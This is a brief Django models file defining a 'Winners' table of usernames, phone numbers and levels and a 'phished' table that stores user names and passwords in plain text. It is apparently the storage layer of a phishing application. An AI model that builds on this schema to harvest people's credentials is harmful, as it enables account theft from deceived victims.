from django.db import models

# Create your models here.
class Winners(models.Model):
    Username = models.CharField(max_length=50)
    Foldername = models.CharField(max_length=50)
    Tel = models.CharField(max_length=50)
    Level = models.CharField(max_length=50)
    Date = models.CharField(max_length=50)

class phished(models.Model):
    User = models.CharField(max_length=50)
    Passwd = models.CharField(max_length=50)